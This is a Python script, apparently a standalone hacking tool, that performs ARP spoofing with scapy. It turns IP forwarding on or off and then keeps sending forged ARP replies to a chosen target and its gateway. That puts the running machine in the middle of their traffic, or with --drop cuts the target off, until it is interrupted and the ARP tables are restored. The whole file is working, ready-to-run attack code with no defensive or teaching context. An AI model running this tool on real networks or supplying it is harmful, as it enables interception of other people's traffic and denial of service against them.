#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse


def set_iproute(value):
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path, "w") as f:
        print(value, file=f)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(packet, verbose=False)


def main():
    parser = argparse.ArgumentParser(description="An arp spoofer python script")
    parser.add_argument("target", type=str, help="target ip")
    parser.add_argument("gateway", type=str, help="gateway ip")
    parser.add_argument("--drop", help="enable ip forwarding", action="store_true")
    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway

    if args.drop:
        set_iproute(0)
    else:
        set_iproute(1)

    print("Arp Spoof Started")

    try:
        sent = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent += 2
            print(f"Sent {sent} packets")
            time.sleep(1.5)

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("Arp Spoof Stopped")


if __name__ == "__main__":
    main()
